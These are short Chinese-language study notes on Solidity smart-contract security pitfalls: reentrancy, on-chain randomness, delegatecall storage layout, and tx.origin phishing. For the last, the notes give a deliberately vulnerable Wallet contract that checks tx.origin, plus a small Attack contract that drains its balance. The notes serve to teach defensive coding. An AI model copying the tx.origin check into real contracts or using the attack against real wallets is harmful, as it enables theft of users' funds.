### 重入攻击
* 先变更状态，再进行转账

---
* 不要使用链上数据构造随机数
* delegatecall 少用，它是根据slot位置进行字段对应的


### 交易原始地址欺骗攻击
* msg.sender 是上层调用者的地址
* tx.origin 读取启动交易的原始地址

```solidity
contract Wallet {
  address public owner;
  constructor() payable {
    owner = msg.sender;
  }
  function transfer(address payable _to, uint _amount) public {
    // 这里万一直接上层不是owner，就会出问题
    // 使用msg.sender 判断
    require(tx.origin == owner, "Not owner");
    (bool sent, ) = _to.call{value: _amount}("");
    require(sent, "Failed to send Ether");
  }
}
contract Attack {
  address payable public owner;
  Wallet wallet;
  constructor(Wallet _wallet) {
    wallet = Wallet(_wallet);
    owner = payable(msg.sender);
  }
  function attack() public {
    wallet.transfer(owner, address(wallet).balance);
  }
}
```
